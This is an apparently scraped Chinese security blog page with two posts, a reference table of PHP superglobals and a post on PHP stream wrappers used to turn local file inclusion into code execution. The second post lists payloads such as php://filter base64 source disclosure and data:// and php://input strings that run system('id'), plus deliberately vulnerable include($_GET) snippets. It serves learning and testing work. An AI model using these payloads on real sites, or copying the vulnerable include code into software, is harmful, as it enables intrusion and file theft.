                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web/" itemprop="url" rel="index">
                    <span itemprop="name">web</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="php全局变量"><a href="#php全局变量" class="headerlink" title="php全局变量"></a>php全局变量</h3><h4 id="REQUEST"><a href="#REQUEST" class="headerlink" title="$\_REQUEST"></a>$\_REQUEST</h4><p>$\_REQUEST 收集GET或者POST数据，如果GET和POST同时有数据，则优先取POST数据。使用超级全局变量 $_REQUEST 来收集 input 标签的值。此例是使用本文件处理表单！</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">&lt;body&gt;</div><div class="line"></div><div class="line">&lt;form method=&quot;post&quot; action=&quot;&lt;?php echo $_SERVER[&apos;PHP_SELF&apos;];?&gt;&quot;&gt;</div><div class="line">Name: &lt;input type=&quot;text&quot; name=&quot;fname&quot;&gt;</div><div class="line">&lt;input type=&quot;submit&quot;&gt;</div><div class="line">&lt;/form&gt;</div><div class="line"></div><div class="line">&lt;?php </div><div class="line">$name = $_REQUEST[&apos;fname&apos;]; </div><div class="line">echo $name; </div><div class="line">?&gt;</div><div class="line"></div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
<h4 id="POST"><a href="#POST" class="headerlink" title="$\_POST"></a>$\_POST</h4><p>$\_POST  广泛用于收集提交 method=&quot;post&quot; 的 HTML 表单后的表单数据。$_POST 也常用于传递变量。</p>
<h4 id="GET"><a href="#GET" class="headerlink" title="$\_GET"></a>$\_GET</h4><p>$_GET   可用于收集提交 HTML 表单 (method=&quot;get&quot;) 之后的表单数据。也可以收集 URL 中的发送的数据。</p>
<h4 id="COOKIE"><a href="#COOKIE" class="headerlink" title="$\_COOKIE"></a>$\_COOKIE</h4><p>$\_COOKIE    用于取回 cookie 的值。</p>
<h4 id="SESSION"><a href="#SESSION" class="headerlink" title="$\_SESSION"></a>$\_SESSION</h4><p>$\_SESSION   存储和取回 session 变量</p>
<p>session中的变量不能通过请求来传递，但是可以响应时通过PHP处理函数进行赋值，而且如果想全局使用，必须加上session_start();</p>
<h4 id="GLOBALS"><a href="#GLOBALS" class="headerlink" title="$GLOBALS"></a>$GLOBALS</h4><p>$GLOBALS 引用全局作用域中可用的全部变量</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&lt;?php </div><div class="line">$x = 75; </div><div class="line">$y = 25;</div><div class="line"> </div><div class="line">function addition() &#123; </div><div class="line">  $GLOBALS[&apos;z&apos;] = $GLOBALS[&apos;x&apos;] + $GLOBALS[&apos;y&apos;]; </div><div class="line">&#125;</div><div class="line"> </div><div class="line">addition(); </div><div class="line">echo $z; </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<h4 id="SERVER"><a href="#SERVER" class="headerlink" title="$\_SERVER"></a>$\_SERVER</h4><p>$_SERVER 保存关于报头、路径和脚本位置的信息</p>
<table>
<thead>
<tr>
<th>元素/代码</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>$_SERVER[&#39;PHP_SELF&#39;]</td>
<td>返回当前执行脚本的文件名。<br><a href="http://example.com/test.php/foo.bar" target="_blank" rel="external">http://example.com/test.php/foo.bar</a> 的脚本中使用 $_SERVER[&#39;PHP_SELF&#39;] 将得到 /test.php/foo.bar</td>
</tr>
<tr>
<td>$_SERVER[&#39;argv&#39;]</td>
<td>传递给该脚本的参数的数组。当脚本以命令行方式运行时，argv 变量传递给程序 C 语言样式的命令行参数。当通过 GET 方式调用时，该变量包含query string。</td>
</tr>
<tr>
<td>$_SERVER[&#39;argc&#39;]</td>
<td>包含命令行模式下传递给该脚本的参数的数目(如果运行在命令行模式下)。</td>
</tr>
<tr>
<td>$_SERVER[&#39;GATEWAY_INTERFACE&#39;]</td>
<td>返回服务器使用的 CGI 规范的版本。</td>
</tr>
<tr>
<td>$_SERVER[&#39;SERVER_ADDR&#39;]</td>
<td>返回当前运行脚本<font color="#f00">所在的服务器的 IP 地址。</font></td>
</tr>
<tr>
<td>$_SERVER[&#39;SERVER_NAME&#39;]</td>
<td>返回当前运行脚本所在的服务器的主机名（比如 <a href="http://www.w3school.com.cn）。如果脚本运行于虚拟主机中，该名称是由那个虚拟主机所设置的值决定。" target="_blank" rel="external">www.w3school.com.cn）。如果脚本运行于虚拟主机中，该名称是由那个虚拟主机所设置的值决定。</a><br><strong>Note</strong>: 在 Apache 2 里，必须设置 <em>UseCanonicalName = On</em> 和 <em>ServerName</em>。 否则该值会由客户端提供，就有可能被伪造。 上下文有安全性要求的环境里，不应该依赖此值。</td>
</tr>
<tr>
<td>$_SERVER[&#39;SERVER_SOFTWARE&#39;]</td>
<td>返回服务器标识字符串,在响应请求时的头信息中给出（比如 Apache/2.2.24）。</td>
</tr>
<tr>
<td>$_SERVER[&#39;SERVER_PROTOCOL&#39;]</td>
<td>返回请求页面时通信协议的名称和版本（例如，“HTTP/1.0”）。</td>
</tr>
<tr>
<td>$_SERVER[&#39;REQUEST_METHOD&#39;]</td>
<td>返回访问页面使用的请求方法（例如 POST/HEAD/PUT/GET）。<br><strong>Note</strong>:如果请求方法为 <em>HEAD</em>，PHP 脚本将在发送 Header 头信息之后终止(这意味着在产生任何输出后，不再有输出缓冲)。</td>
</tr>
<tr>
<td>$_SERVER[&#39;REQUEST_TIME&#39;]</td>
<td>返回请求开始时的时间戳（例如 1577687494）。&gt;5.1.0</td>
</tr>
<tr>
<td>$_SERVER[&#39;REQUEST_TIME_FLOAT&#39;]</td>
<td>返回请求开始时的时间戳，微秒级别的精准度。&gt;5.4.0</td>
</tr>
<tr>
<td>$_SERVER[&#39;DOCUMENT_ROOT&#39;]</td>
<td>当前运行脚本所在的文档根目录。在服务器配置文件中定义。</td>
</tr>
<tr>
<td>$_SERVER[&#39;QUERY_STRING&#39;]</td>
<td>返回查询字符串，如果是通过查询字符串访问此页面。</td>
</tr>
<tr>
<td>$_SERVER[&#39;HTTP_ACCEPT&#39;]</td>
<td>返回来自当前请求的请求头。</td>
</tr>
<tr>
<td>$_SERVER[&#39;HTTP_ACCEPT_CHARSET&#39;]</td>
<td>返回来自当前请求的 Accept-Charset 头（ 例如 utf-8,ISO-8859-1）</td>
</tr>
<tr>
<td>$_SERVER[&#39;HTTP_ACCEPT_LANGUAGE&#39;]</td>
<td>当前请求头中 Accept-Language: 项的内容，如果存在的话。例如：“en”。</td>
</tr>
<tr>
<td>$_SERVER[&#39;HTTP_ACCEPT_ENCODING&#39;]</td>
<td>当前请求的 Accept-Encoding: 头部的内容。例如：“gzip”。</td>
</tr>
<tr>
<td>$_SERVER[&#39;HTTP_CONNECTION&#39;]</td>
<td>当前请求头中 Connection: 项的内容，如果存在的话。例如：“Keep-Alive”。</td>
</tr>
<tr>
<td>$_SERVER[&#39;HTTP_HOST&#39;]</td>
<td>返回来自当前请求的 Host 头。</td>
</tr>
<tr>
<td>$_SERVER[&#39;HTTP_REFERER&#39;]</td>
<td>引导用户代理到当前页的前一页的地址（如果存在）。由 user agent 设置决定。并不是所有的用户代理都会设置该项，有的还提供了修改 HTTP_REFERER 的功能。简言之，该值并不可信。</td>
</tr>
<tr>
<td>$_SERVER[&#39;HTTP_USER_AGENT&#39;]</td>
<td>当前请求头中 User-Agent: 项的内容，如果存在的话。该字符串表明了访问该页面的用户代理的信息。一个典型的例子是：Mozilla/4.5 [en] (X11; U; Linux 2.2.9 i586)。除此之外，你可以通过 get_browser() 来使用该值，从而定制页面输出以便适应用户代理的性能。</td>
</tr>
<tr>
<td>$_SERVER[&#39;HTTPS&#39;]</td>
<td>是否通过安全 HTTP 协议查询脚本。<br><strong>Note</strong>: 注意当使用 IIS 上的 ISAPI 方式时，如果不是通过 HTTPS 协议被访问，这个值将为 <em>off</em>。</td>
</tr>
<tr>
<td>$_SERVER[&#39;HTTP_VIA&#39;]</td>
<td>返回Via中的代理服务器IP</td>
</tr>
<tr>
<td>$_SERVER[&#39;HTTP_CLIENT_IP&#39;]</td>
<td>返回Client-IP中的客户端IP</td>
</tr>
<tr>
<td>$_SERVER[&#39;REMOTE_ADDR&#39;]</td>
<td>返回浏览当前页面的用户的 IP 地址。</td>
</tr>
<tr>
<td>$_SERVER[&#39;HTTP_X\_FORWARDED\_FOR&#39;]</td>
<td>返回X-Forwarded-For内容</td>
</tr>
<tr>
<td>$_SERVER[&#39;REMOTE_HOST&#39;]</td>
<td>返回浏览当前页面的用户的主机名。<br><strong>Note</strong>: 你的服务器必须被配置以便产生这个变量。例如在 Apache 中，你需要在 httpd.conf 中设置 <em>HostnameLookups On</em> 来产生它。参见 <a href="http://php.net/manual/zh/function.gethostbyaddr.php" target="_blank" rel="external">gethostbyaddr()</a>。</td>
</tr>
<tr>
<td>$_SERVER[&#39;REMOTE_PORT&#39;]</td>
<td>返回用户机器上连接到 Web 服务器所使用的端口号。</td>
</tr>
<tr>
<td>$_SERVER[&#39;REMOTE_USER&#39;]</td>
<td>经验证的用户</td>
</tr>
<tr>
<td>$_SERVER[&#39;REDIRECT_REMOTE_USER&#39;]</td>
<td>验证的用户，如果请求已在内部重定向。</td>
</tr>
<tr>
<td>$_SERVER[&#39;SCRIPT_FILENAME&#39;]</td>
<td>返回当前执行脚本的绝对路径。<br><strong>Note</strong>:如果在命令行界面（Command Line Interface, CLI）使用相对路径执行脚本，例如 file.php 或 ../file.php，那么 $_SERVER[&#39;SCRIPT_FILENAME&#39;] 将包含用户指定的相对路径。</td>
</tr>
<tr>
<td>$_SERVER[&#39;SERVER_ADMIN&#39;]</td>
<td>该值指明了 Apache 服务器配置文件中的 SERVER_ADMIN 参数。如果脚本运行在一个虚拟主机上，则该值是那个虚拟主机的值。</td>
</tr>
<tr>
<td>$_SERVER[&#39;SERVER_PORT&#39;]</td>
<td>Web 服务器使用的端口。默认值为 “<em>80</em>”。如果使用 SSL 安全连接，则这个值为用户设置的 HTTP 端口。<br><strong>Note</strong>: 在 Apache 2 里，为了获取真实物理端口，必须设置 <em>UseCanonicalName = On</em> 以及 <em>UseCanonicalPhysicalPort = On</em>。 否则此值可能被伪造，不一定会返回真实端口值。 上下文有安全性要求的环境里，不应该依赖此值。</td>
</tr>
<tr>
<td>$_SERVER[&#39;SERVER_SIGNATURE&#39;]</td>
<td>返回服务器版本和虚拟主机名。</td>
</tr>
<tr>
<td>$_SERVER[&#39;PATH_TRANSLATED&#39;]</td>
<td>当前脚本所在文件系统（非文档根目录）的基本路径。这是在服务器进行虚拟到真实路径的映像后的结果。<br><strong>Note</strong>: 自 PHP 4.3.2 起，PATH_TRANSLATED 在 Apache 2 SAPI 模式下不再和 Apache 1 一样隐含赋值，而是若 Apache 不生成此值，PHP 便自己生成并将其值放入 SCRIPT_FILENAME 服务器常量中。这个修改遵守了 CGI 规范，PATH_TRANSLATED 仅在 PATH_INFO 被定义的条件下才存在。 Apache 2 用户可以在 httpd.conf 中设置 <em>AcceptPathInfo = On</em> 来定义 PATH_INFO。</td>
</tr>
<tr>
<td>$_SERVER[&#39;SCRIPT_NAME&#39;]</td>
<td>返回当前脚本的路径</td>
</tr>
<tr>
<td>$_SERVER[&#39;SCRIPT_URI&#39;]</td>
<td>返回当前页面的 URI。</td>
</tr>
<tr>
<td>$_SERVER[&#39;HTTP_UPGRADE_INSECURE_REQUESTS&#39;]</td>
<td>返回Upgrade-Insecure-Requests中的数据</td>
</tr>
<tr>
<td>$_SERVER[&quot;HTTP_CACHE_CONTROL&quot;]</td>
<td>返回Cache-Control中的数据</td>
</tr>
<tr>
<td>&#39;PHP_AUTH_DIGEST&#39;</td>
<td>当作为 Apache 模块运行时，进行 HTTP Digest 认证的过程中，此变量被设置成客户端发送的“Authorization” HTTP 头内容（以便作进一步的认证操作）。</td>
</tr>
<tr>
<td>&#39;PHP_AUTH_USER&#39;</td>
<td>当 PHP 运行在 Apache 或 IIS（PHP 5 是 ISAPI）模块方式下，并且正在使用 HTTP 认证功能，这个变量便是用户输入的用户名。</td>
</tr>
<tr>
<td>&#39;PHP_AUTH_PW&#39;</td>
<td>当 PHP 运行在 Apache 或 IIS（PHP 5 是 ISAPI）模块方式下，并且正在使用 HTTP 认证功能，这个变量便是用户输入的密码。</td>
</tr>
<tr>
<td>&#39;AUTH_TYPE&#39;</td>
<td>当 PHP 运行在 Apache 模块方式下，并且正在使用 HTTP 认证功能，这个变量便是认证的类型。</td>
</tr>
<tr>
<td>&#39;PATH_INFO&#39;</td>
<td>包含由客户端提供的、跟在真实脚本名称之后并且在查询语句（query string）之前的路径信息，如果存在的话。例如，如果当前脚本是通过 URL <a href="http://www.example.com/php/path_info.php/some/stuff?foo=bar" target="_blank" rel="external">http://www.example.com/php/path_info.php/some/stuff?foo=bar</a> 被访问，那么 $_SERVER[&#39;PATH_INFO&#39;] 将包含 /some/stuff。</td>
</tr>
<tr>
<td>&#39;ORIG_PATH_INFO&#39;</td>
<td>在被 PHP 处理之前，“PATH_INFO” 的原始版本。</td>
</tr>
</tbody>
</table>
<h4 id="FILES"><a href="#FILES" class="headerlink" title="$\_FILES"></a>$\_FILES</h4><p>$_FILES 可以从客户计算机向远程服务器上传文件。<br>    第一个参数是表单的 input name，第二个下标可以是 &quot;name&quot;, &quot;type&quot;, &quot;size&quot;, &quot;tmp_name&quot; 或 &quot;error&quot;<br>    例子：<br>        $_FILES[&quot;file&quot;][&quot;name&quot;] - 被上传文件的名称<br>        $_FILES[&quot;file&quot;][&quot;type&quot;] - 被上传文件的类型<br>        $_FILES[&quot;file&quot;][&quot;size&quot;] - 被上传文件的大小，以字节计<br>        $_FILES[&quot;file&quot;][&quot;tmp_name&quot;] - 存储在服务器的文件的临时副本的名称<br>        $_FILES[&quot;file&quot;][&quot;error&quot;] - 由文件上传导致的错误代码</p>
<h4 id="ENV"><a href="#ENV" class="headerlink" title="$\_ENV"></a>$\_ENV</h4><p>$_ENV   通过环境方式传递给当前脚本的变量的数组。</p>
<p>这些变量被从 PHP 解析器的运行环境导入到 PHP 的全局命名空间。很多是由支持 PHP 运行的 Shell 提供的，并且不同的系统很可能运行着不同种类的 Shell，所以不可能有一份确定的列表。请查看你的 Shell 文档来获取定义的环境变量列表。<br>其他环境变量包含了 CGI 变量，而不管 PHP 是以服务器模块还是 CGI 处理器的方式运行。</p>
<table>
<thead>
<tr>
<th>元素/代码</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>$_ENV[&quot;ALLUSERSPROFILE&quot;]</td>
<td>C:\Documents and Settings\All Users</td>
</tr>
<tr>
<td>$_ENV[&quot;ClusterLog&quot;]</td>
<td>C:\WINDOWS\Cluster\cluster.log</td>
</tr>
<tr>
<td>$_ENV[&quot;CommonProgramFiles&quot;]</td>
<td>C:\Program Files\Common Files</td>
</tr>
<tr>
<td>$_ENV[&quot;COMPUTERNAME&quot;]</td>
<td>LIUBO</td>
</tr>
<tr>
<td>$_ENV[&quot;ComSpec&quot;]</td>
<td>C:\WINDOWS\system32\cmd.exe</td>
</tr>
<tr>
<td>$_ENV[&quot;FP_NO_HOST_CHECK&quot;]</td>
<td>NO</td>
</tr>
<tr>
<td>$_ENV[&quot;NUMBER_OF_PROCESSORS&quot;]</td>
<td>1</td>
</tr>
<tr>
<td>$_ENV[&quot;OS&quot;]</td>
<td>Windows_NT</td>
</tr>
<tr>
<td>$_ENV[&quot;Path&quot;]</td>
<td>C:\WINDOWS\system32;C:\WINDOWS;C:\WINDOWS\System32\Wbem;E:\Program Files\MySQL\MySQL Server 5.0\bin;c:\php;c:\php\ext</td>
</tr>
<tr>
<td>$_ENV[&quot;PATHEXT&quot;]</td>
<td>.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH</td>
</tr>
<tr>
<td>$_ENV[&quot;PROCESSOR_ARCHITECTURE&quot;]</td>
<td>x86</td>
</tr>
<tr>
<td>$_ENV[&quot;PROCESSOR_IDENTIFIER&quot;]</td>
<td>x86 Family 15 Model 4 Stepping 1, GenuineIntel</td>
</tr>
<tr>
<td>$_ENV[&quot;PROCESSOR_LEVEL&quot;]</td>
<td>15</td>
</tr>
<tr>
<td>$_ENV[&quot;PROCESSOR_REVISION&quot;]</td>
<td>0401</td>
</tr>
<tr>
<td>$_ENV[&quot;ProgramFiles&quot;]</td>
<td>C:\Program Files</td>
</tr>
<tr>
<td>$_ENV[&quot;SystemDrive&quot;]</td>
<td>C:</td>
</tr>
<tr>
<td>$_ENV[&quot;SystemRoot&quot;]</td>
<td>C:\WINDOWS</td>
</tr>
<tr>
<td>$_ENV[&quot;TEMP&quot;]</td>
<td>d:\</td>
</tr>
<tr>
<td>$_ENV[&quot;TMP&quot;]</td>
<td>d:\</td>
</tr>
<tr>
<td>$_ENV[&quot;USERPROFILE&quot;]</td>
<td>C:\Documents and Settings\Default User</td>
</tr>
<tr>
<td>$_ENV[&quot;windir&quot;]</td>
<td>C:\WINDOWS</td>
</tr>
</tbody>
</table>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/08/27/php伪协议/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/08/27/php伪协议/" itemprop="url">php伪协议</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-27T00:37:29+08:00">
                2017-08-27
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web/" itemprop="url" rel="index">
                    <span itemprop="name">web</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>本文参考的是 Hello_C的php伪协议这篇文章，内容大部分时粘贴过来的。当然也参考了先知上的文章：<a href="https://xianzhi.aliyun.com/forum/mobile/read/795.html" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/mobile/read/795.html</a>——如何优雅的把lfi转化为rce（2017-02-27更新版）。当然，先知上的文章有点问题，因为web用户可能没有那么高的权限去访问log文件或者打开allow_url_include设置。</p>
<h3 id="PHP协议-封装协议"><a href="#PHP协议-封装协议" class="headerlink" title="PHP协议/封装协议"></a>PHP协议/封装协议</h3><table>
<thead>
<tr>
<th>包装或协议</th>
<th>控制能力</th>
<th>allow_url_include</th>
<th>漏洞类型</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>file://</td>
<td>-</td>
<td>Off</td>
<td>LFI /文件操作</td>
<td></td>
</tr>
<tr>
<td>glob://</td>
<td>-</td>
<td>Off</td>
<td>目录遍历</td>
<td></td>
</tr>
<tr>
<td>php://filter/read</td>
<td>include</td>
<td>Off</td>
<td>文件泄露</td>
<td>PHP：//filter/read=convert.base64-encode/resource=index.php</td>
</tr>
<tr>
<td>php://filter/write</td>
<td>file_put_contents</td>
<td>Off</td>
<td>编码</td>
<td>file_put_contents(“php://filter/write=string.rot13/resource=x.txt”,”content”);</td>
</tr>
<tr>
<td>php://input</td>
<td>include</td>
<td>On</td>
<td>RCE</td>
<td>Encoding is required while reading .php source: &lt;?php echo base64_encode(file_get_contents(“solution.php”));?&gt; OR just use &lt;?php system(‘cat x.php’);?&gt;</td>
</tr>
<tr>
<td>data://</td>
<td>include</td>
<td>On</td>
<td>RCE</td>
<td>data:text/plain,&lt;?php system(“id”)?&gt; OR data:text/plain;base64,PD9waHAgc3lzdGVtKCJpZCIpPz4=</td>
</tr>
<tr>
<td>zip://</td>
<td>include + uploaded file</td>
<td>Off</td>
<td>RCE</td>
<td></td>
</tr>
<tr>
<td>phar://</td>
<td>include + uploaded file</td>
<td>Off</td>
<td>RCE</td>
<td>PHP版本&gt; = 5.3</td>
</tr>
</tbody>
</table>
<p>php中支持的伪协议</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">file:// — 访问本地文件系统</div><div class="line">http:// — 访问 HTTP(s) 网址</div><div class="line">ftp:// — 访问 FTP(s) URLs</div><div class="line">php:// — 访问各个输入/输出流（I/O streams）</div><div class="line">zlib:// — 压缩流</div><div class="line">data:// — 数据（RFC 2397）</div><div class="line">glob:// — 查找匹配的文件路径模式</div><div class="line">phar:// — PHP 归档</div><div class="line">ssh2:// — Secure Shell 2</div><div class="line">rar:// — RAR</div><div class="line">ogg:// — 音频流</div><div class="line">expect:// — 处理交互式的流</div></pre></td></tr></table></figure>
<p>这里可以参考<a href="http://php.net/manual/zh/wrappers.php" target="_blank" rel="external">官方文档</a>进行查看。而遇见最多的也就是php://协议了：</p>
<ul>
<li><h4 id="php-stdin"><a href="#php-stdin" class="headerlink" title="php://stdin"></a>php://stdin</h4><p>主要用于php cli的输入</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">while($line = fopen(&apos;php://stdin&apos;,&apos;r&apos;))&#123;  </div><div class="line">    echo fgets($line);  </div><div class="line">&#125;  </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p><a href="/images/2017-07-28/f0b778051856c477.jpg"><img src="http://i4.buimg.com/567571/f0b778051856c477.jpg" alt="img"></a></p>
<ul>
<li><h4 id="php-stdout"><a href="#php-stdout" class="headerlink" title="php://stdout"></a>php://stdout</h4><p>主要用于php cli的输入<code>&lt;?php  $fh = fopen(&#39;php://stdout&#39;, &#39;w&#39;);  fwrite($fh, &quot;标准输出php://stdout\n&quot;);  fclose($fh);  fwrite(STDOUT, &quot;标准输出STDOUT\n&quot;);  ?&gt;</code></p>
</li>
</ul>
<p><a href="/images/2017-07-28/e62036bab64c514b.jpg"><img src="http://i4.buimg.com/567571/e62036bab64c514b.jpg" alt="img"></a></p>
<ul>
<li><h4 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h4><p>可以读取到post没有解析的原始数据<code>&lt;?php   echo file_get_contents($_GET[&quot;a&quot;]);  ?&gt;</code></p>
</li>
</ul>
<p><a href="/images/2017-07-28/caba05f9460d9dbe.jpg"><img src="http://i4.buimg.com/567571/caba05f9460d9dbe.jpg" alt="img"></a><br>当php代码换成</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">$code = $_GET[&apos;a&apos;];  </div><div class="line">include($code);  </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>而且当php远程包含打开的时候（当allow_url_include=on),就可以造成任意代码执行。<br><a href="/images/2017-07-28/52bcb6ca96711975.jpg"><img src="http://i4.buimg.com/567571/52bcb6ca96711975.jpg" alt="img"></a></p>
<ul>
<li><h4 id="php-output"><a href="#php-output" class="headerlink" title="php://output"></a>php://output</h4><p>是一个只写的数据流， 允许你以 print 和 echo 一样的方式 写入到输出缓冲区<code>&lt;?php   $code=$_GET[&quot;a&quot;];   file_put_contents($code,&quot;test&quot;);   ?&gt;</code></p>
</li>
</ul>
<p><a href="/images/2017-07-28/ab8f21052b4e2890.jpg"><img src="http://i4.buimg.com/567571/ab8f21052b4e2890.jpg" alt="img"></a></p>
<ul>
<li><h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h4><p>是一种元封装器， 设计用于数据流打开时的筛选过滤应用<code>&lt;?php  $filename=$_GET[&quot;a&quot;];  $data=&quot;test&quot;;  file_put_contents($filename, $data);  ?&gt;</code></p>
</li>
</ul>
<p>?a=php://filter/write=string.tolower/resource=test.php<br>可以往服务器中写入一个文件内容全为小写且文件名为test.php的文件：<br>其中 ：<br>（1）string.tolower //写入内容全部变成小写<br>（2）string.toupper //写入内容全部变成大写<br>（3）string.rot13 //写入内容全部对字符串执行 ROT13 编码<br>通过：?a=php://filter/convert.base64-encode/resource=test.php<br>可以往服务器中写入一个文件内容为base64编码且文件名为test.php的文件<br><a href="/images/2017-07-28/f80e4710de9ee31d.jpg"><img src="http://i2.muimg.com/567571/f80e4710de9ee31d.jpg" alt="img"></a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">$filename=$_GET[&quot;a&quot;];  </div><div class="line">echo file_get_contents($filename);  </div><div class="line">?&gt; </div><div class="line"></div><div class="line">&lt;?php  </div><div class="line">$filename=$_GET[&quot;a&quot;]; </div><div class="line">include(&quot;$filename&quot;);  </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>?a=php://filter/convert.base64-encode/resource=test.php,就可以把test.php的内容以base64编码的方式显示出来</p>
<p>双引号包含的变量$filename，可以当成正常变量执行，而单引号包裹的变量则会当成字符串</p>
<ul>
<li><p>那么可以用?hax=expect://command 来执行任意linux指令，但是：<br>Note:该封装协议默认未开启<br>为了使用 expect:// 封装器，你必须安装» PECL 上的 » Expect扩展。</p>
</li>
<li><h4 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h4><p>数据流封装器<br>当allow_url_include 打开的时候，任意文件包含就会成为任意命令执行<code>&lt;?php  $filename=$_GET[&quot;a&quot;];  include(&quot;$filename&quot;);  ?&gt;</code></p>
</li>
</ul>
<p><a href="/images/2017-07-28/19570d7acea8b8a7.jpg"><img src="http://i4.buimg.com/567571/19570d7acea8b8a7.jpg" alt="img"></a></p>
<p>参考链接：<br><a href="http://blog.csdn.net/niexinming/article/details/52605144" target="_blank" rel="external">http://blog.csdn.net/niexinming/article/details/52605144</a></p>
<ul>
<li><strong>本文作者：</strong> Hello_C</li>
<li><strong>本文链接：</strong> <a href="http://yoursite.com/%E4%BB%A3%E7%A0%81/2017/04/09/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE.html">http://yoursite.com/代码/2017/04/09/PHP伪协议.html</a></li>
<li><strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" target="_blank" rel="external">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/08/16/XMAN之旅——MIPS/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/08/16/XMAN之旅——MIPS/" itemprop="url">XMAN之旅——MIPS</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-16T15:10:28+08:00">
                2017-08-16
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/xman/" itemprop="url" rel="index">
                    <span itemprop="name">xman</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
